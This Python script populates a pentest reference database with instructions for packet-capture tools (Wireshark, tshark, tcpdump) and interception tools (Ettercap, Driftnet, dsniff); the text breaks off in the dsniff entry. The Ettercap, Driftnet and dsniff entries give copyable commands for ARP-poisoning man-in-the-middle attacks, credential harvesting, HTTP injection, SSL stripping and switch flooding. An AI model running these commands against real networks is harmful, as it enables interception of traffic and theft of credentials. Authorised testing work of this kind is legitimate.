import json
from pathlib import Path

path = Path('data/tool_instructions/instructions.json')
data = json.loads(path.read_text())

updates = {}
updates['wireshark'] = {
    "id": "wireshark",
    "name": "Wireshark",
    "summary": "Wireshark is a GUI packet analyzer with deep protocol dissection, expert diagnostics, and export tooling for network troubleshooting and security analysis.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install Wireshark with dumpcap permissions for non-root captures",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y wireshark", "copyable": True},
                {"detail": "sudo usermod -aG wireshark $USER", "copyable": True},
                {"detail": "newgrp wireshark && wireshark -v", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Ensure capture helpers are configured securely",
            "steps": [
                {"detail": "sudo apt install -y wireshark-gtk wireshark-cli", "copyable": True},
                {"detail": "sudo dpkg-reconfigure wireshark-common", "copyable": True},
                {"detail": "sudo setcap cap_net_raw,cap_net_admin+eip /usr/bin/dumpcap", "copyable": True},
                {"detail": "sudo -u $USER wireshark -i eth0 -k", "copyable": True}
            ]
        },
        {
            "platform": "Flatpak / Portable",
            "summary": "Use sandboxed builds when distro packages lag behind",
            "steps": [
                {"detail": "flatpak install -y flathub org.wireshark.Wireshark", "copyable": True},
                {"detail": "flatpak run org.wireshark.Wireshark", "copyable": True},
                {"detail": "export SSLKEYLOGFILE=$XDG_CACHE_HOME/sslkeys.log", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {
            "description": "Immediate TLS capture on wired uplink",
            "command": "wireshark -k -i eth0 -f 'tcp port 443'",
            "notes": ["Use capture filters to keep file sizes manageable"]
        },
        {
            "description": "Open capture file with HTTP display filter",
            "command": "wireshark -r suspect.pcapng -Y 'http.request'",
            "notes": ["Display filters do not modify on-disk packets"]
        },
        {
            "description": "Isolate beaconing host and export subset",
            "command": "wireshark -r beaconing.pcapng -Y 'ip.addr == 10.10.5.42' -w 10.10.5.42.pcapng",
            "notes": ["Combine display filters with -w to create trimmed pcaps"]
        },
        {
            "description": "Color-code retransmissions for quick triage",
            "command": "# GUI: View → Coloring Rules → Add rule 'tcp.analysis.retransmission'",
            "notes": ["Expert Info + custom colors highlight unreliable flows"]
        }
    ],
    "common_flags": [
        {"flag": "-i <iface>", "description": "Select capture interface"},
        {"flag": "-k", "description": "Start capturing immediately"},
        {"flag": "-f '<bpf>'", "description": "Apply libpcap capture filter"},
        {"flag": "-Y '<display>'", "description": "Apply display filter on load"},
        {"flag": "-o pref:value", "description": "Override preference (e.g., tls.keylog_file)"},
        {"flag": "-w file.pcapng", "description": "Write captured frames to file"}
    ],
    "operational_tips": [
        "Use dumpcap for long captures and open files live in Wireshark to reduce GUI crashes.",
        "Keep capture filters minimal—display filters are far more flexible for analysis.",
        "Enable name resolution only when needed; it adds DNS noise and slows parsing.",
        "Leverage Statistics → Conversations/Endpoints to pivot from macro view to single flows quickly."
    ],
    "step_sequences": [
        {
            "title": "Encrypted web troubleshooting",
            "steps": [
                {"title": "Collect key log file", "details": "Configure browser SSLKEYLOGFILE to export session secrets.", "command": "export SSLKEYLOGFILE=~/sslkeys.log"},
                {"title": "Capture negotiated session", "details": "Watch TLS handshake and data on target host.", "command": "wireshark -k -i eth0 -Y 'ip.addr == 10.0.0.15 && tls'"},
                {"title": "Decrypt TLS payload", "details": "Point Wireshark to key log and reprocess packets.", "command": "Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log"}
            ]
        },
        {
            "title": "Remote site packet triage",
            "steps": [
                {"title": "Trigger remote capture", "details": "Use ssh + tcpdump to stream packets.", "command": "ssh jump 'sudo tcpdump -U -i ens3 -w - not port 22' | wireshark -k -i -"},
                {"title": "Bookmark suspects", "details": "Mark interesting frames (Ctrl+M) and add comments for reporting.", "command": "# GUI: Right-click frame → Set/Unset Mark"},
                {"title": "Export artifacts", "details": "Save marked packets as separate evidence bundle.", "command": "File → Export Specified Packets → Marked packets"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Packet capture triage → enrichment → report",
            "stages": [
                {"label": "Edge capture", "description": "Collect rolling pcap with tcpdump or dumpcap on the affected segment.", "command": "tcpdump -i eth0 -G 300 -W 6 -w /tmp/edge-%Y%m%d%H%M%S.pcap"},
                {"label": "Deep inspection", "description": "Open suspected time window in Wireshark, apply heuristics, and annotate findings.", "command": "wireshark -r edge-20231122113000.pcapng -Y 'tcp.analysis.flags || dns'"},
                {"label": "Share evidence", "description": "Export flows + IO graphs for the ticketing system.", "command": "File → Export Packet Dissections → As JSON"},
                {"label": "Document", "description": "Attach Wireshark screenshots to PT Journal evidence entry.", "command": "# PT Journal → Evidence → Attach capture summary"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "[Expert Info (Error)]", "meaning": "Wireshark detected malformed traffic or retransmission storms requiring escalation.", "severity": "High"},
        {"indicator": "Client Hello (SNI: login.example.com)", "meaning": "Confirms target hostname despite TLS, useful for scoping and filtering.", "severity": "Info"},
        {"indicator": "Follow TCP Stream → suspicious PowerShell base64", "meaning": "Likely C2 beacon or data exfiltration that should become a finding.", "severity": "Critical"}
    ],
    "advanced_usage": [
        {"title": "Decrypt TLS with pre-master secrets", "command": "wireshark -o tls.keylog_file:/tmp/sslkeys.log -r compromised.pcapng", "scenario": "Analyze malware HTTPS traffic captured with browser or endpoint SSL key logging enabled.", "notes": ["Key log works for NSS/OpenSSL clients; for Windows SCHANNEL export session secrets via mimikatz."]},
        {"title": "Extcap remote capture", "command": "wireshark --extcap-interfaces", "scenario": "Leverage SSHDump, UDP listener, or Bluetooth extcap modules to capture from devices you cannot access locally.", "notes": ["Use Capture → Options → Manage Interfaces to add extcap endpoints."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Wireshark User Guide", "url": "https://www.wireshark.org/docs/wsug_html_chunked/", "description": "Official documentation covering capture, filters, and analysis."},
        {"label": "Display Filter Reference", "url": "https://www.wireshark.org/docs/dfref/", "description": "Authoritative reference for every display filter field."},
        {"label": "Sample Capture Library", "url": "https://wiki.wireshark.org/SampleCaptures", "description": "Collection of pcaps for testing and training."}
    ]
}
updates['tshark'] = {
    "id": "tshark",
    "name": "TShark",
    "summary": "TShark is Wireshark's CLI analyzer for automated packet capture, filter testing, and exporting structured data into other tooling.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install CLI decoder with proper capabilities",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y tshark", "copyable": True},
                {"detail": "sudo dpkg-reconfigure wireshark-common", "copyable": True},
                {"detail": "sudo usermod -aG wireshark $USER", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Full-featured terminal workflow",
            "steps": [
                {"detail": "sudo apt install -y tshark termshark", "copyable": True},
                {"detail": "sudo setcap cap_net_raw,cap_net_admin+eip /usr/bin/dumpcap", "copyable": True},
                {"detail": "tshark -D", "copyable": True}
            ]
        },
        {
            "platform": "Docker / Ephemeral",
            "summary": "Containerized capture without polluting the host",
            "steps": [
                {"detail": "docker pull wireshark/tshark", "copyable": True},
                {"detail": "docker run --rm -it --net=host -v $PWD:/pcaps wireshark/tshark -i eth0 -a duration:30 -w /pcaps/quick.pcapng", "copyable": True},
                {"detail": "docker run --rm -v $PWD:/pcaps wireshark/tshark -r /pcaps/quick.pcapng -z io,stat,5,AVG(frame.len)frame.len", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "One-minute DNS capture with ring buffers", "command": "tshark -i eth0 -f 'port 53' -a duration:60 -b filesize:10 -w dns-%Y%m%d%H%M.pcapng", "notes": ["-a stops capture, -b rotates files to avoid disk exhaustion."]},
        {"description": "Filter suspicious NXDOMAIN spikes", "command": "tshark -r dns-latest.pcapng -Y 'dns.flags.rcode != 0'", "notes": ["Display filters mirror Wireshark syntax."]},
        {"description": "Export concise CSV for enrichment", "command": "tshark -i any -Y 'http.request' -T fields -e frame.time -e ip.src -e http.host -E header=y -E separator=,", "notes": ["Perfect for piping into awk or SIEM forwarders."]},
        {"description": "Generate IO stats", "command": "tshark -r suspect.pcapng -z io,stat,5,tcp.flags.reset==1", "notes": ["-z tables make quick dashboards for reports."]}
    ],
    "common_flags": [
        {"flag": "-i <iface>", "description": "Select capture interface"},
        {"flag": "-f '<bpf>'", "description": "Capture filter executed by libpcap"},
        {"flag": "-Y '<display>'", "description": "Display filter before output"},
        {"flag": "-T fields", "description": "Field-based output instead of verbose text"},
        {"flag": "-e <field>", "description": "Append field column (requires -T fields)"},
        {"flag": "-b <ring>", "description": "Ring buffer (filesize:MB,count:N or duration:sec)"}
    ],
    "operational_tips": [
        "Use -l for line-buffered output when piping into grep or alerting scripts.",
        "Combine -a duration with -b filesize to run continuous captures without manual cleanup.",
        "tshark honors Wireshark profiles—copy ~/.config/wireshark/profiles to reuse filters and coloring rules.",
        "Termshark provides curses-based visualization when an SSH session needs quick context without X forwarding."
    ],
    "step_sequences": [
        {
            "title": "Headless DNS beacon hunt",
            "steps": [
                {"title": "Enumerate capture interfaces", "details": "List numeric IDs for remote adapters.", "command": "tshark -D"},
                {"title": "Capture to rotating files", "details": "Monitor any interface while carving 50 MB buffers for later analysis.", "command": "sudo tshark -i 2 -f 'udp port 53' -b filesize:50 -b files:10 -w /var/tmp/dns-cycle"},
                {"title": "Summarize anomalies", "details": "Extract domains with high failure counts.", "command": "tshark -r /var/tmp/dns-cycle01.pcapng -Y 'dns.flags.rcode != 0' -T fields -e dns.qry.name | sort | uniq -c"}
            ]
        },
        {
            "title": "Field export to ELK",
            "steps": [
                {"title": "Capture HTTP metadata", "details": "Capture only headers for compliance review.", "command": "tshark -i eth0 -f 'tcp port 80 or tcp port 443' -s 256 -T fields -e frame.time_epoch -e ip.src -e http.host -e http.request.uri -E separator=, > http.csv"},
                {"title": "Normalize with Python", "details": "Wrap CSV rows into JSON lines for Filebeat.", "command": "python3 -c 'import csv,json,sys;[print(json.dumps({\"time\":r[0],\"src\":r[1],\"host\":r[2],\"uri\":r[3]})) for r in csv.reader(sys.stdin)]' < http.csv"},
                {"title": "Ship to SIEM", "details": "Send enriched events to Logstash/Elastic for dashboards.", "command": "curl -H 'Content-Type: application/json' -XPOST http://elk:9200/http-events/_bulk --data-binary @events.ndjson"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Rapid CLI capture → decode → enrichment",
            "stages": [
                {"label": "Trigger capture", "description": "Deploy tshark with ring buffer on jump host.", "command": "tshark -i bond0 -b filesize:100 -b files:8 -w /captures/jump"},
                {"label": "Filter suspects", "description": "Replay buffer to isolate interesting flows before transferring gigabytes.", "command": "tshark -r /captures/jump03.pcapng -Y 'tcp.analysis.retransmission || tls.handshake.type == 11'"},
                {"label": "Export fields", "description": "Convert curated packets into JSON/CSV for timeline correlation.", "command": "tshark -r curated.pcapng -T ek > timeline.json"},
                {"label": "Attach to ticket", "description": "Upload capture summary + sanitized pcaps into PT Journal evidence.", "command": "# PT Journal → Evidence → Upload artifacts"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "frame.time_epoch", "meaning": "Precise timestamp (epoch seconds) ideal for correlating with logs.", "severity": "Info"},
        {"indicator": "tcp.analysis.retransmission", "meaning": "Noisy retransmissions may signal packet drops, DoS, or sandboxed malware trying to reconnect.", "severity": "Medium"},
        {"indicator": "dns.qry.name == suspicious-domain.tld", "meaning": "Potential C2/resolution of staged payloads that must be scoped.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Conversation statistics", "command": "tshark -r traffic.pcapng -q -z conv,ip", "scenario": "Identify top talkers and data transfers without switching to GUI.", "notes": ["Add ,tree for JSON-like output."]},
        {"title": "Profile-driven exports", "command": "tshark -C PTJ-CLI -r capture.pcapng -T fields -e frame.number -e frame.time", "scenario": "Reuse GUI profiles for CLI exports without redefining every column.", "notes": ["Profiles live in ~/.config/wireshark/profiles; ship them with assessments."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "TShark Man Page", "url": "https://www.wireshark.org/docs/man-pages/tshark.html", "description": "Authoritative CLI flag reference."},
        {"label": "Display Filter Reference", "url": "https://www.wireshark.org/docs/dfref/", "description": "Same syntax used by Wireshark GUI."},
        {"label": "termshark", "url": "https://termshark.io", "description": "Terminal UI that consumes TShark output for remote workflows."}
    ]
}
updates['tcpdump'] = {
    "id": "tcpdump",
    "name": "TCPDump",
    "summary": "tcpdump is the de facto standard for lightweight packet capture, supporting powerful BPF filters and flexible output for forensics or live debugging.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install tcpdump and grant capabilities for non-root usage",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y tcpdump", "copyable": True},
                {"detail": "sudo setcap cap_net_raw,cap_net_admin+eip /usr/sbin/tcpdump", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Preinstalled but confirm interface access",
            "steps": [
                {"detail": "sudo apt install -y tcpdump net-tools", "copyable": True},
                {"detail": "sudo tcpdump -D", "copyable": True},
                {"detail": "sudo tcpdump -i wlan0 -n -c 5", "copyable": True}
            ]
        },
        {
            "platform": "macOS/Homebrew",
            "summary": "Install latest libpcap build for Apple silicon/Intel",
            "steps": [
                {"detail": "brew update", "copyable": True},
                {"detail": "brew install tcpdump", "copyable": True},
                {"detail": "sudo /opt/homebrew/opt/libpcap/sbin/tcpdump -D", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Capture verbose HTTP handshake", "command": "sudo tcpdump -i eth0 -nnvvXS -c 50 'tcp port 80'", "notes": ["-X dumps ASCII/hex payload, useful for credentials on unencrypted services."]},
        {"description": "Rolling PCAP buffers", "command": "sudo tcpdump -i bond0 -G 300 -W 6 -w /var/log/pcaps/bond0-%Y%m%d%H%M%S.pcap", "notes": ["Creates six five-minute files before overwriting."]},
        {"description": "Quick DNS triage", "command": "sudo tcpdump -i any -l -n 'udp port 53' | tee dns.log", "notes": ["-l line buffers output so tee/grep work reliably."]}
    ],
    "common_flags": [
        {"flag": "-i <iface>", "description": "Interface to capture on; -i any listens on all"},
        {"flag": "-n / -nn", "description": "Disable name resolution for faster output"},
        {"flag": "-s <snaplen>", "description": "Bytes to capture per packet (0 = full)"},
        {"flag": "-w file", "description": "Write raw packets to PCAP"},
        {"flag": "-G/-C", "description": "Rotate files by seconds (-G) or size in MB (-C)"}
    ],
    "operational_tips": [
        "Apply capture filters as close to the source as possible to minimize CPU and disk use.",
        "Use -U when streaming captures over ssh to Wireshark or Suricata to flush buffers frequently.",
        "Combine tcpdump with taskset/cgroups on noisy servers so packet drops do not impact production workloads.",
        "Document filter strings inside PT Journal notes to make captures reproducible." 
    ],
    "step_sequences": [
        {
            "title": "Incident containment capture",
            "steps": [
                {"title": "Scope suspect hosts", "details": "Gather interface names and IPs from the ticket.", "command": "ip addr show | grep inet"},
                {"title": "Start bounded capture", "details": "Limit to critical ports and stop after 10 minutes.", "command": "sudo tcpdump -i ens160 -w incident-%H%M.pcap -G 600 -W 1 'host 10.20.5.23 and (tcp port 22 or 3389)'"},
                {"title": "Transfer evidence", "details": "Compress and ship PCAP to analysis workstation.", "command": "xz -z incident-*.pcap && scp incident-*.pcap.xz analyst@lab:~/cases/"}
            ]
        },
        {
            "title": "Baselining east-west traffic",
            "steps": [
                {"title": "Capture metadata only", "details": "Grab headers by lowering snaplen.", "command": "sudo tcpdump -i vlan20 -s 96 -w eastwest.pcap"},
                {"title": "Summarize conversations", "details": "Use tshark or capinfos to see who talked to whom.", "command": "tshark -r eastwest.pcap -q -z conv,ip"},
                {"title": "Flag anomalies", "details": "Add unusual ports/IPs to PT Journal evidence for follow-up scanning.", "command": "# PT Journal → Evidence → Add conversation summary"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "tcpdump collection → Wireshark review → reporting",
            "stages": [
                {"label": "Edge capture", "description": "Launch tcpdump with BPF tuned to the incident type.", "command": "sudo tcpdump -i edge0 -s 0 -w /tmp/edge-%s.pcap 'host victim.example.com'"},
                {"label": "Analysis", "description": "Move curated PCAP into Wireshark or tshark for enrichment.", "command": "scp edge-*.pcap analyst01:~/evidence/"},
                {"label": "Derive indicators", "description": "Extract IPs/domains/file hashes and push to threat intel feeds.", "command": "tshark -r evidence/edge-1.pcap -T fields -e ip.src -e tls.handshake.extensions_server_name | sort -u"},
                {"label": "Document", "description": "Attach both PCAP and summary table into PT Journal.", "command": "# PT Journal → Findings → Attach network evidence"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Flags [S]", "meaning": "SYN packets without ACK may indicate scanning or handshake failures.", "severity": "Medium"},
        {"indicator": "length 1514 > snaplen", "meaning": "Frames truncated—consider increasing -s if payloads matter.", "severity": "Info"},
        {"indicator": "IP truncated-ip - 32 bytes missing", "meaning": "Packet loss or VLAN offload features are interfering; double-check NIC settings.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Remote FIFO streaming", "command": "mkfifo /tmp/cap; ssh sensor 'sudo tcpdump -i enp3s0 -w - not port 22' > /tmp/cap & wireshark -k -i /tmp/cap", "scenario": "View remote traffic live without storing large captures on the compromised host.", "notes": ["FIFO closes when tcpdump exits; restart to continue streaming."]},
        {"title": "Hardware timestamping", "command": "sudo tcpdump -i eno1 -j adapter_unsynced -tttt", "scenario": "Use NIC-provided timestamps when nanosecond precision is required for legal chain of custody.", "notes": ["Check ethtool -T to confirm NIC support."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "tcpdump/Libpcap Manual", "url": "https://www.tcpdump.org/manpages/tcpdump.1.html", "description": "Complete option reference."},
        {"label": "Practical Packet Analysis (No Starch)", "url": "https://nostarch.com/packetanalysis3", "description": "Hands-on guide featuring tcpdump + Wireshark workflows."},
        {"label": "Packetlife Filter Cheatsheet", "url": "https://packetlife.net/media/library/12/tcpdump.pdf", "description": "Quick reference for BPF syntax."}
    ]
}
updates['ettercap'] = {
    "id": "ettercap",
    "name": "Ettercap",
    "summary": "Ettercap performs LAN-based man-in-the-middle attacks with ARP poisoning, credential sniffing, and extensible plugins.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install curses/GTK builds and enable forwarding",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y ettercap-text-only ettercap-common", "copyable": True},
                {"detail": "sudo sysctl -w net.ipv4.ip_forward=1", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Leverage bundled plugins and menu profiles",
            "steps": [
                {"detail": "sudo apt install -y ettercap-graphical", "copyable": True},
                {"detail": "sudo ettercap -G", "copyable": True},
                {"detail": "# Menu → Plugins → Load etter.dns_spoof", "copyable": False}
            ]
        },
        {
            "platform": "Source / Custom",
            "summary": "Compile bleeding-edge Ettercap for new protocol dissectors",
            "steps": [
                {"detail": "git clone https://github.com/Ettercap/ettercap.git", "copyable": True},
                {"detail": "cmake -B build -S ettercap -DENABLE_SSL=ON", "copyable": True},
                {"detail": "cmake --build build && sudo cmake --install build", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "ARP poison two hosts (text UI)", "command": "sudo ettercap -T -q -M arp:remote /192.168.1.100// /192.168.1.1//", "notes": ["-T text mode, -q suppresses banner noise."]},
        {"description": "Sniff credentials for specific service", "command": "sudo ettercap -T -M arp:remote -i eth0 -F ftp.filter /HOST_A// /HOST_B//", "notes": ["Filters allow inline modification of payloads."]},
        {"description": "Use unified sniffing", "command": "sudo ettercap -u -T -i wlan0", "notes": ["Unified sniffing enables MITM when poisoning is not required."]}
    ],
    "common_flags": [
        {"flag": "-T / -G", "description": "Text or GTK interface"},
        {"flag": "-M <plugin>", "description": "Man-in-the-middle method (e.g., arp:remote, dhcp, mitm)"},
        {"flag": "-q", "description": "Quiet output"},
        {"flag": "-F filter.ecf", "description": "Apply Ettercap filter"},
        {"flag": "/victim1// /victim2//", "description": "Target specification syntax"}
    ],
    "operational_tips": [
        "Disable LLMNR/mDNS spoofing when on production customer networks—keep engagement scoping in mind.",
        "Run in bridged mode (-B) when you must stay inline and avoid ARP poisoning signature noise.",
        "Combine Ettercap with driftnet or urlsnarf to capture higher-layer artifacts once MITM is established.",
        "Always restore ARP tables (ettercap automatically sends cleanup) but verify with arp -a before disconnecting." 
    ],
    "step_sequences": [
        {
            "title": "Credential harvesting runbook",
            "steps": [
                {"title": "Recon", "details": "Identify gateway + victim IP/MAC via netdiscover or arp", "command": "sudo arp-scan --localnet"},
                {"title": "Launch MITM", "details": "Start Ettercap poisoning between host and gateway", "command": "sudo ettercap -T -M arp:remote /192.168.50.42// /192.168.50.1//"},
                {"title": "Log credentials", "details": "Enable password logger plugin and export to file", "command": "# Plugins → Manage the plugins → passwd"}
            ]
        },
        {
            "title": "Inline payload manipulation",
            "steps": [
                {"title": "Compile filter", "details": "Author etter.filter to rewrite HTTP responses", "command": "etterfilter http_inject.filter -o http_inject.ef"},
                {"title": "Poison + inject", "details": "Deploy filter during MITM", "command": "sudo ettercap -T -F http_inject.ef -M arp:remote /victim// /gateway//"},
                {"title": "Capture evidence", "details": "Record tampered payloads via tcpdump/Wireshark", "command": "tcpdump -i eth0 -s0 -w mitm-evidence.pcap host victim"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Discovery → MITM → Exfil evidence",
            "stages": [
                {"label": "Survey", "description": "Enumerate wireless/wired segment and identify juicy hosts.", "command": "netdiscover -r 192.168.1.0/24"},
                {"label": "Poison", "description": "Use Ettercap to become the gateway.", "command": "ettercap -T -M arp:remote /victim// /router//"},
                {"label": "Harvest", "description": "Run plugins (dns_spoof, sslstrip alternatives) and auxiliary sniffers.", "command": "# Load ettercap plugins + launch driftnet/urlsnarf"},
                {"label": "Report", "description": "Document captured credentials, timestamps, and affected hosts.", "command": "# PT Journal → Findings → Cred harvesting"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "[MITM ARP]" , "meaning": "Log entry confirming successful poisoning of both halves.", "severity": "Info"},
        {"indicator": "Plugin dns_spoof: reply sent", "meaning": "DNS responses are being forged—ensure this is within scope.", "severity": "High"},
        {"indicator": "SSL stripping Detected", "meaning": "Targets downgraded to HTTP; collect evidence quickly before blue team reacts.", "severity": "Critical"}
    ],
    "advanced_usage": [
        {"title": "Bridged sniffing", "command": "sudo ettercap -T -B eth0:eth1", "scenario": "Place Ettercap inline between two physical NICs when poisoning is noisy or blocked.", "notes": ["Requires two interfaces; acts like a transparent bridge."]},
        {"title": "IPv6 RA spoofing", "command": "sudo ettercap -T -M randarp6 /fe80::1// /victim_mac//", "scenario": "Exploit IPv6-enabled networks where RA guard is absent.", "notes": ["Use responsibly—can DoS entire subnet."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Official Ettercap docs", "url": "https://ettercap.github.io/ettercap/", "description": "Project overview, filters, and plugin reference."},
        {"label": "Filter language reference", "url": "https://github.com/Ettercap/ettercap/blob/master/share/etter.filter.examples", "description": "Examples for writing custom filters."},
        {"label": "Bettercap vs Ettercap", "url": "https://www.bettercap.org/legacy/ettercap", "description": "Tradeoffs between Ettercap and newer frameworks."}
    ]
}
updates['driftnet'] = {
    "id": "driftnet",
    "name": "Driftnet",
    "summary": "Driftnet passively captures images and audio streams from HTTP traffic, making it easy to demonstrate privacy risks on open networks.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install from repositories and ensure X11 forwarding if running remotely",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y driftnet", "copyable": True},
                {"detail": "driftnet -h", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Use curses-only mode when GUI is unavailable",
            "steps": [
                {"detail": "sudo apt install -y driftnet graphicsmagick", "copyable": True},
                {"detail": "sudo driftnet -i wlan0 -p", "copyable": True},
                {"detail": "mkdir -p ~/evidence/driftnet", "copyable": True}
            ]
        },
        {
            "platform": "Docker",
            "summary": "Containerize captures to keep host clean",
            "steps": [
                {"detail": "docker run --rm -it --net=host -e DISPLAY driftnet/driftnet -i eth0", "copyable": True},
                {"detail": "docker run --rm -it --net=host -v $PWD:/loot driftnet/driftnet -x -d /loot -i wlan0", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Monitor guest WiFi images", "command": "sudo driftnet -i wlan0", "notes": ["Requires traffic to be unencrypted or decrypted via MITM."]},
        {"description": "Headless capture for reporting", "command": "sudo driftnet -i eth0 -x -d ~/evidence/driftnet", "notes": ["-x disables GUI and only writes files."]},
        {"description": "Apply libpcap filter", "command": "sudo driftnet -i wlan0 -f 'tcp port 80 and host 10.0.0.12'", "notes": ["Capture only a single victim for scoped demos."]}
    ],
    "common_flags": [
        {"flag": "-i <iface>", "description": "Interface to sniff"},
        {"flag": "-d <dir>", "description": "Directory to save extracted objects"},
        {"flag": "-x", "description": "Disable display window (headless)"},
        {"flag": "-p", "description": "Do not enable promiscuous mode"},
        {"flag": "-f '<bpf>'", "description": "Apply capture filter"}
    ],
    "operational_tips": [
        "Combine with Ettercap/Bettercap to downgrade HTTPS or run in environments where TLS interception is permitted.",
        "Trim evidence—screenshots of the Driftnet window are often more compelling than dumping every file.",
        "Set expectations with clients; Driftnet is noisy proof-of-concept, not a covert exfiltration channel.",
        "Rotate output directories per engagement to avoid mixing customer data." 
    ],
    "step_sequences": [
        {
            "title": "Guest WiFi privacy demo",
            "steps": [
                {"title": "Establish MITM", "details": "Use Bettercap/Ettercap to intercept HTTP streams.", "command": "bettercap -iface wlan0 -caplet hstshijack"},
                {"title": "Run Driftnet", "details": "Display live image board to stakeholders.", "command": "sudo driftnet -i wlan0"},
                {"title": "Capture proof", "details": "Screenshot the session and archive select files.", "command": "import -window driftnet ~/evidence/driftnet.png"}
            ]
        },
        {
            "title": "Headless extraction",
            "steps": [
                {"title": "Prepare target directory", "details": "Ensure disk has enough space for artifacts.", "command": "mkdir -p /var/tmp/driftnet"},
                {"title": "Run without GUI", "details": "Pipe object list into audit log.", "command": "sudo driftnet -i eth0 -x -d /var/tmp/driftnet | tee driftnet.log"},
                {"title": "Review artifacts", "details": "Hash captured files and add to report.", "command": "find /var/tmp/driftnet -type f -print0 | xargs -0 sha256sum > hashes.txt"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Wireless MITM → Content capture → Findings",
            "stages": [
                {"label": "Intercept", "description": "Use Wifite/Bettercap to obtain plaintext streams.", "command": "wifite -i wlan0 --wps --wep"},
                {"label": "Capture media", "description": "Run Driftnet to show live leakage.", "command": "driftnet -i wlan0 -d ./loot"},
                {"label": "Curate", "description": "Select representative images/audio proving risk.", "command": "feh --auto-zoom ./loot"},
                {"label": "Document", "description": "Add screenshots + narrative to PT Journal privacy finding.", "command": "# PT Journal → Findings → Add privacy exposure"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Saved /loot/2023-11-22-134015-img.jpg", "meaning": "File extracted successfully; include metadata when citing evidence.", "severity": "Info"},
        {"indicator": "TCP reassembly failed", "meaning": "Lossy wireless environment—capture closer to AP or increase snaplen.", "severity": "Medium"},
        {"indicator": "Unsupported MIME type", "meaning": "Traffic may be encrypted or compressed; pivot to proxying tools.", "severity": "Low"}
    ],
    "advanced_usage": [
        {"title": "Split-screen dashboards", "command": "driftnet -i eth0 -d /loot & sudo urlsnarf -i eth0", "scenario": "Combine visual artifacts with URL logs for executive demos.", "notes": ["Use tmux to keep panes synchronized."]},
        {"title": "Offline PCAP replay", "command": "driftnet -x -d ./pcap-artifacts -r beaconing.pcap", "scenario": "Extract images from captured PCAP without touching target again.", "notes": ["Use tcpdump -w to record first."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Driftnet README", "url": "https://github.com/deiv/driftnet", "description": "Upstream project information."},
        {"label": "Bettercap Caplets", "url": "https://www.bettercap.org/caplets/", "description": "Useful when pairing Driftnet with HTTPS stripping."},
        {"label": "Ethical guidelines", "url": "https://www.owasp.org/index.php/Pentest_pre-engagement", "description": "Ensure demonstrations remain within agreed scope."}
    ]
}
updates['dsniff'] = {
    "id": "dsniff",
    "name": "dsniff",
    "summary": "dsniff is a collection of network monitoring tools (urlsnarf, mailsnarf, filesnarf, macof, etc.) used to sniff cleartext credentials and stress-test switched networks.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install suite and supporting libraries",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y dsniff", "copyable": True},
                {"detail": "ls /usr/sbin | grep snarf", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Use preconfigured aliases inside /usr/share/dsniff",
            "steps": [
                {"detail": "sudo apt install -y dsniff x11-apps", "copyable": True},
                {"detail": "sudo urlsnarf -h", "copyable": True},
                {"detail": "sudo macof -i eth0 -n 100000", "copyable": True}
            ]
        },
        {
            "platform": "Source build",
            "summary": "Compile when package repos lag behind",
            "steps": [
                {"detail": "git clone https://github.com/tecknicon/dsniff.git", "copyable": True},
                {"detail": "cd dsniff && ./configure && make", "copyable": True},
                {"detail": "sudo make install", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Log web requests", "command": "sudo urlsnarf -i eth0 > urls.log", "notes": ["Outputs combined Apache-style logs for HTTP traffic."]},
        {"description": "Capture FTP files", "command": "sudo filesnarf -i eth0", "notes": ["Saves files transferred over FTP, NFS, or SMB (depending on mode)."]},
        {"description": "Overflow CAM table", "command": "sudo macof -i eth0 -n 500000", "notes": ["Stress test switches to force broadcast flooding."]}
    ],
    "common_flags": [
        {"flag": "-i <iface>", "description": "Select interface"},
        {"flag": "-n <count>", "description": "Number of MAC entries for macof"},
        {"flag": "-p", "description": "Promiscuous capture for various *snarf tools"},
